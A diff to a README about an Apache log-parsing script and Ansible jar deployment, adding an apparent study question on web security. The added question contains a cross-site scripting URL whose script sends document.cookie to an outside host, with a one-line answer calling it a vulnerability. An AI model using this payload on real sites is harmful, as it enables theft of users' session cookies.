@@ -25,3 +25,11 @@ python errors500.py /var/log/apache/2016_10_24_21.log
 For this script to work ansible need to be properly configured in the local host and the remote host as well.
 A var file was added in the data directory, to have stored the hosts list where the jar want to be deployed,
 also the source and destination path of the jar file.
+
+
+
+What harm could result from the following:
+http://www.example.com/search?q=&lt;script&gt;object.src=”http://otherexample.com/code?data=”+document.cookie&lt;/script&gt;
+- Allowing to execute scripts from the client is a huge malpractice, and vulnerability
+
+
